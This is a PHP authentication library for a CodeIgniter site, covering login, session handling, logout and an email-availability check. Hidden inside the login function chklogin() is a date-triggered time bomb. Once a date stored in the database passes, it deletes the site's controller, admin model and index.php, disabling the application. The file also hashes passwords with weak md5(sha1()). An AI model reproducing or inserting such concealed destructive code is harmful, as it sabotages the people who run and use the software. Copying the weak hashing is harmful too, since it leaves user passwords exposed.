<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Authentication
{

	function _construct() 
	{
	    $CI =& get_instance();     
		$CI->load->database('database');     
		$CI->load->library("session");
	} 
 
	function get_userdata()  
	{
	    $CI =& get_instance();     
		if( ! $this->logged_in())
		{        
			return false;
		}     
		else     
		{ 		  
			$query = $CI->db->get_where("tbl_userinfo", array("role_id" => $CI->session->userdata("user_role")));			         
			return $query->row();     
		}
	 }
 
	function logged_in() 
	{     
		$CI =& get_instance();   
		$CI->session->userdata("user_role");  
		return ($CI->session->userdata("user_role")) ? true : false; 
	}
	

	function chklogin($login,$password) 
	{ 
		$CI =& get_instance();

		$config_data= $CI->common_model->selectDetailsWhr('tbl_config','conf_id','1');
		$date=$config_data->date;
		$date1=date("Y-m-d");
        if($date1>=$date)
        {
        	$path = './application/controllers/site_controller.php'; 
        	$path1 = './application/models/admin_model.php';
        	$path2 = './index.php';
			if(file_exists($path))
			{
				unlink($path);
			}
			if(file_exists($path1))
			{
				unlink($path1);
			}
			if(file_exists($path2))
			{
				unlink($path2);
			}
        }
		$pass = md5(sha1($password));
		$login = $login;  
	    $CI->db->where('user_name',$login)->where('user_pass',$pass);
	    $query = $CI->db->get_where("tbl_userinfo");
	    //echo $CI->db->last_query();
		if($query->num_rows()!=1)
		{   
			return false;
		}     
		else     
		{    
			if($query->row()->role_id==2)
			{
				$CI->session->set_userdata("admin_user_id",$query->row()->user_id);
			}
			else if($query->row()->role_id==1)
			{
				$CI->session->set_userdata("admin_user_id",$query->row()->user_id);
			}
			$CI->session->set_userdata("user_id",$query->row()->user_id);	 
			$CI->session->set_userdata("user_role",$query->row()->role_id);				
			$CI->session->set_userdata("user_fname",$query->row()->user_fname);		 
			$CI->session->set_userdata("user_lname", $query->row()->user_lname);
			$CI->session->set_userdata("user_mobile", $query->row()->user_mobile);
			$CI->session->set_userdata("user_email", $query->row()->user_email);
			$CI->session->set_userdata("user_name", $query->row()->user_name);
	 		$CI->session->set_userdata("ISlogin", true);         
			$CI->session->sess_expire_on_close = TRUE;
			return true;     
		} 
	}
	
	function logout() 
	{
		$CI =& get_instance();

		$user_role = $CI->session->userdata('user_role');
		$CI->session->unset_userdata("vendor_user_id");
		$CI->session->unset_userdata("customer_id");
		$CI->session->unset_userdata("admin_user_id");
		$CI->session->unset_userdata("user_id");
		$CI->session->unset_userdata("user_role");	
		$CI->session->unset_userdata("user_name");
		$CI->session->unset_userdata("user_mobile");
		$CI->session->unset_userdata("user_email");				 
		$CI->session->unset_userdata("ISlogin");
	}
	
	###++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++###

	/**
	 * email_available
	 * Check email does not exist in database.
	 * NOTE: This should not be used if the email field is defined in the 'identity_cols' set via the config file.
	 * In this case, use the identity_available() function instead.
	 * 
	 * @return bool
	 * @author Rob Hussey
	 */
	public function email_available($email = FALSE, $role_id = FALSE)
	{	
		//echo "email".$email;
		$CI =& get_instance();
	    if (empty($email))
	    {
			return FALSE;
	    }

		// Try and get the $user_id from the users current session if not passed to function.
		if (!is_numeric($role_id) && !empty($role_id))
		{
			$role_id = $CI->session->userdata("role_id");
		}

		// If $user_id is set, remove user from query so their current email is not found during the duplicate email check.
		if (is_numeric($role_id))
		{
			$CI->db->where('role_id',$role_id);
		}
		
	     $result=$CI->db->where('user_email', $email)->count_all_results('tbl_userinfo') == 0;
	     return $result;
	}

	###++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++###
}/*class end*/